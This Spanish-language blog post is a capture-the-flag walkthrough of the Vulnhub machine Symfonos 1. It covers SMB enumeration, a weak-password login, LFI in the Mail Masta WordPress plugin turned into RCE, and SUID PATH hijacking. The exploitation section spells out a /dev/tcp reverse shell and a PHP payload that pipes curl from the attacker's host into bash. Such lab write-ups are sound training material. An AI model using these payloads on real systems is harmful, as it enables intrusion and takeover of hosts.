---
title: "Symfonos 1 - Vulnhub"
layout: post
date: 2023-12-24 10:50
tags:
  - Vulnhub
  - Symfonos
  - SMB Enumeration
  - Information Leakage
  - WordPress Enumeration
  - Abusing WordPress Plugin - Mail Masta 1.0
  - Local File Inclusion (LFI)
  - LFI to RCE with php filter chain generator
  - Abusing SUID privilege + PATH Hijacking [Privilege Escalation]
image: /assets/images/vulnhub/Symfonos1/symfonos1.png
headerImage: true
projects: false
hidden: false
description: "Symfonos 1 - Vunlhub"
category: blog
author: CAHOn3R
externalLink: false
---

Hoy es Nochebuena. Antes de empezar con la máquina, quiero recordar a todas las personas que he dejado atrás debido al sacrificio que esto conlleva. Siempre quieres saber más, pero el tiempo es finito; hay que sacarlo de donde sea. Si estás solo en una noche como esta, respáldate en el hacking; él te lo devolverá. Y si tienes a alguien, disfruta y sé feliz.

Happy Hacking y Feliz Navidad.

# Enumeración
Dicho esto empezamos con la máquina, como siempre que hacemos una máquina que estamos corriendo en local empezamos con **arp-scan** para detectar la **IP**.
```bash
arp-scan -I eth0 --localnet --ignoredups

192.168.0.11	00:0c:29:3f:59:d9	VMware, Inc.
```

Tenemos **IP**, vamos con el escaneo de puertos mediante **nmap**.
```bash
nmap -p- -sS --min-rate 5000 --open -n -Pn -oG allPorts 192.168.0.11

PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

-p- # para escanear los 65535 puertos que existen
-sS # para realizar un escaneo tipo "SYN scan"
--min-rate 5000 # para indicarle no se envien menos de 5k paquetes por segundo
--open # para que solo reporte puertos abiertos
-vvv # para que muestre por consola lo máximo posible y lo antes posible
-n # para realizar un escaneo prescindiendo de la resolución de nombres de dominio
-Pn # para que no realice la detección del estado del host antes de iniciar el escaneo
-oG # para especificar un formato de salida en modo greppable en el archivo allPorts
```

Corremos los scripts básicos de reconocimiento para ver que versiones y servicios corren para estos puertos.
```bash
nmap -sCV -p 22,25,80,139,445 192.168.0.11 -oN targeted
PORT    STATE SERVICE     VERSION

22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
25/tcp  open  smtp        Postfix smtpd
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-sC # Activa los scripts de secuencia de comandos predeterminados (también conocidos como "scripts de inicio") en Nmap. Estos scripts realizan una variedad de tareas para detectar servicios y vulnerabilidades comunes en un sistema.
-sV # Intenta determinar las versiones de servicios que están en ejecución en los puertos abiertos.
# obvio información para que sea más legible.
```

Vemos puertos jugosos, entre ellos **smb** y un dominio **symfonos.local**, meto el dominio en el archivo **/etc/hosts** y paso a enumerar el servicio **smb**.
```bash
echo '192.168.0.11\tsymfonos.local' >> /etc/hosts 
```

```bash
smbmap -H 192.168.0.11 --no-banner
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
[+] IP: 192.168.0.11:445	Name: symfonos.local      	Status: Authenticated
Disk                                                  	Permissions	Comment
----                                                  	-----------	-------
print$                                            	NO ACCESS	Printer Drivers
helios                                            	NO ACCESS	Helios personal share
anonymous                                         	READ ONLY	
IPC$                                              	NO ACCESS	IPC Service (Samba 4.5.16-Debian)

```
Tenemos permiso de lectura en el directorio **Anonymous**, vamos a ver qué hay ahí.

Me conecto al recurso compartido con **smbclient**, me lo descargo con **get** y lo leo en mí máquina.
```bash
smbclient -N \\\\192.168.0.11\\anonymous
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jun 29 03:14:49 2019
  ..                                  D        0  Sat Jun 29 03:12:15 2019
  attention.txt                       N      154  Sat Jun 29 03:14:49 2019

smb: \> get attention.txt 
getting file \attention.txt of size 154 as attention.txt (75.2 KiloBytes/sec) (average 75.2 KiloBytes/sec)
smb: \> ^C
❯ cat attention.txt
   Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 
   Next person I find using one of these passwords will be fired! 
   -Zeus
```
Resulta ser una nota, de un tal **Zeus** y con tres palabras clave que al parecer la gente utiliza como password, **epidioko**, **qwerty** y **baseball**. Siendo **Zeus** el que dice esto damos por hecho que él no las utiliza, aun así pruebo tanto por **SSH** como por **smb**, pero no hay suerte.

Si recordamos tenemos otro posible nombre de usuario **Helios**, lo vimos en el escaneo con **smbmap**, así que probaremos con ese username.
```bash
smbmap -H 192.168.0.11 --no-banner -u 'helios' -p 'qwerty'
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
[+] IP: 192.168.0.11:445	Name: symfonos.local      	Status: Authenticated
Disk                                                  	Permissions	Comment
----                                                  	-----------	-------
print$                                            	READ ONLY	Printer Drivers
helios                                            	READ ONLY	Helios personal share
anonymous                                         	READ ONLY	
IPC$                                              	NO ACCESS	IPC Service (Samba 4.5.16-Debian)

```
Tenemos capacidad de lectura en **helios** y en **print**, a ver que nos encontramos.

```bash
smbmap -H 192.168.0.11 --no-banner -u 'helios' -p 'qwerty' -r helios
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
[+] IP: 192.168.0.11:445	Name: symfonos.local      	Status: Authenticated
Disk                                                  	Permissions	Comment
----                                                  	-----------	-------
print$                                            	READ ONLY	Printer Drivers
helios                                            	READ ONLY	Helios personal share
./helios
dr--r--r--                0 Sat Jun 29 02:32:05 2019	.
dr--r--r--                0 Sat Jun 29 02:37:04 2019	..
fr--r--r--              432 Sat Jun 29 02:32:05 2019	research.txt
fr--r--r--               52 Sat Jun 29 02:32:05 2019	todo.txt
anonymous                                         	READ ONLY	
IPC$                                              	NO ACCESS	IPC Service (Samba 4.5.16-Debian)
 
```
Vemos dos archivos, me los descargo los dos, el **todo.txt** tiene un directorio, y el otro una nota que no parece relevante.

```bash
cat todo.txt
1. Binge watch Dexter
2. Dance
3. Work on /h3l105
```
Es un **WordPress**, procedo a enumerar los plugins, es algo que suelo hacer, ya que hay muchos que son vulnerables.

Estos son los plugins que tiene instalados:
```bash
curl -s 'http://192.168.0.11/h3l105/' | grep -oP '/plugins/.*?/' | sort -u | tr '/' '\n' | grep -v 'plugins'
mail-masta
site-editor
```
Uno de ellos lo conozco y sé que es vulnerable a un **Local File Inclusion**, no obstante haremos la investigación pertinente.

```bash
searchsploit mail masta
WordPress Plugin Mail Masta 1.0 - Local File Inclusion    
WordPress Plugin Mail Masta 1.0 - Local File Inclusion (2)
WordPress Plugin Mail Masta 1.0 - SQL Injection           
```

Tenemos un **LFI** en esta ruta `/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=` aquí os dejo un ejemplo.
[<img src="/assets/images/vulnhub/Symfonos1/captura1.png">](/assets/images/vulnhub/Symfonos1/captura1.png)
Podemos leer el archivo **/etc/passwd**, pero no vamos a ir por ahí, vamos a ganar acceso al sistema de una forma un poco más interesante.
# Explotación

Vamos a jugar con la herramienta [php_filter_chain_generator.py](https://github.com/synacktiv/php_filter_chain_generator/tree/main), cuando tenemos un **LFI** y podemos utilizar wrappers PHP, podemos tratar de convertir el **LFI** a un **RCE** mediante la utilización de esta herramienta.

La idea es hacer una reverse shell lo más corta posible, ya que así evitamos errores del servidor web, vamos por pasos.

1. Descargar el script [php_filter_chain_generator.py](https://github.com/synacktiv/php_filter_chain_generator/tree/main)

2. Crear el archivo "r" (por ejemplo)
	> echo 'bash -i >& /dev/tcp/TÚ-IP/443 0>&'

3. Ponernos en escucha por el puerto anterior con **nc**
	> nc -nlvp 443

4. Compartir un servidor HTTP con **Python** donde tengamos el archivo "r"
	> python3 -m http.server 80

5.  Ejecutar la herramienta [php_filter_chain_generator.py](https://github.com/synacktiv/php_filter_chain_generator/tree/main) para que nos genere la cadena que nos otorgará la reverse shell
	 > python3 php_filter_chain_generator.py --chain '<?= `curl -s 192.168.0.36/r|bash` ?>'

6. Introducir la cadena en la URL para ganar acceso al sistema
[<img src="/assets/images/vulnhub/Symfonos1/captura2.png">](/assets/images/vulnhub/Symfonos1/captura2.png)
Ya estamos dentro de la máquina víctima.

# Privesc

Primero hacemos el tratamiento de la **TTY** para tener una consola interactiva.
```bash
script /dev/null -c bash
^Z # CTRL+Z
stty raw -echo; fg
	reset xterm
export TERM=xterm SHELL=bash
stty rows X columns X # tus filas y columnas 
```

Para empezar buscamos archivos **SUID** como de costumbre, esta vez vemos algo que se sale de lo común.
```bash
find / -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn

/opt/statuscheck

/bin/mount
/bin/umount
/bin/su
/bin/ping
```

El archivo pertenece al usuario **root**.
```bash
helios@symfonos:/tmp$ ls -l /opt/statuscheck 
-rwsr-xr-x 1 root root 8640 Jun 28  2019 /opt/statuscheck
```

Lo ejecuto para ver que hace y vemos una sintaxis muy similar a la de **curl**, si no la misma...
```bash
helios@symfonos:/opt$ ./statuscheck 
HTTP/1.1 200 OK
Date: Sun, 24 Dec 2023 10:22:28 GMT
Server: Apache/2.4.25 (Debian)
Last-Modified: Sat, 29 Jun 2019 00:38:05 GMT
ETag: "148-58c6b9bb3bc5b"
Accept-Ranges: bytes
Content-Length: 328
Vary: Accept-Encoding
Content-Type: text/html
```

Le hago un `strings` para ver un poco lo que hace por detrás y vemos algo que llama la atención, está utilizando **curl**, pero de forma relativa, la manera correcta de hacerlo sería de forma absoluta, es decir, llamando a la ruta absoluta del binario, por ejemplo `/usr/bin/curl`.
[<img src="/assets/images/vulnhub/Symfonos1/captura3.png">](/assets/images/vulnhub/Symfonos1/captura3.png)
Haciéndolo de esta forma podemos explotar un [Path Hijacking](https://deephacking.tech/path-hijacking-y-library-hijacking/) tal y como explica este artículo.

Voy a crear un archivo en el directorio **/tmp** que se va a llamar **curl**, y dentro voy a decirle que me otorgue una **shell** como **root**, posteriormente alteraremos el **PATH** para que acceda primero al directorio **/tmp** de esta manera en lugar de ejecutar el **curl** "legítimo" en realidad el **statuscheck** leerá nuestro **curl** y al ejecutarlo como **root** nos otorgará una **/bin/sh** como root.

```bash
/tmp
echo '/bin/sh' > curl
chmod +x curl
export PATH=/tmp:$PATH
/opt/statuscheck
```
Ya somos root y podemos leer el flag.

```bash
# cat /root/proof.txt

	Congrats on rooting symfonos:1!

                 \ __
--==/////////////[})))==*
                 / \ '          ,|
                    `\`\      //|                             ,|
                      \ `\  //,/'                           -~ |
   )             _-~~~\  |/ / |'|                       _-~  / ,
  ((            /' )   | \ / /'/                    _-~   _/_-~|
 (((            ;  /`  ' )/ /''                 _ -~     _-~ ,/'
 ) ))           `~~\   `\\/'/|'           __--~~__--\ _-~  _/, 
((( ))            / ~~    \ /~      __--~~  --~~  __/~  _-~ /
 ((\~\           |    )   | '      /        __--~~  \-~~ _-~
    `\(\    __--(   _/    |'\     /     --~~   __--~' _-~ ~|
     (  ((~~   __-~        \~\   /     ___---~~  ~~\~~__--~ 
      ~~\~~~~~~   `\-~      \~\ /           __--~~~'~~/
                   ;\ __.-~  ~-/      ~~~~~__\__---~~ _..--._
                   ;;;;;;;;'  /      ---~~~/_.-----.-~  _.._ ~\     
                  ;;;;;;;'   /      ----~~/         `\,~    `\ \        
                  ;;;;'     (      ---~~/         `:::|       `\\.      
                  |'  _      `----~~~~'      /      `:|        ()))),      
            ______/\/~    |                 /        /         (((((())  
          /~;;.____/;;'  /          ___.---(   `;;;/             )))'`))
         / //  _;______;'------~~~~~    |;;/\    /                ((   ( 
        //  \ \                        /  |  \;;,\                 `   
       (<_    \ \                    /',/-----'  _> 
        \_|     \\_                 //~;~~~~~~~~~ 
                 \_|               (,~~   
                                    \~\
                                     ~~

```
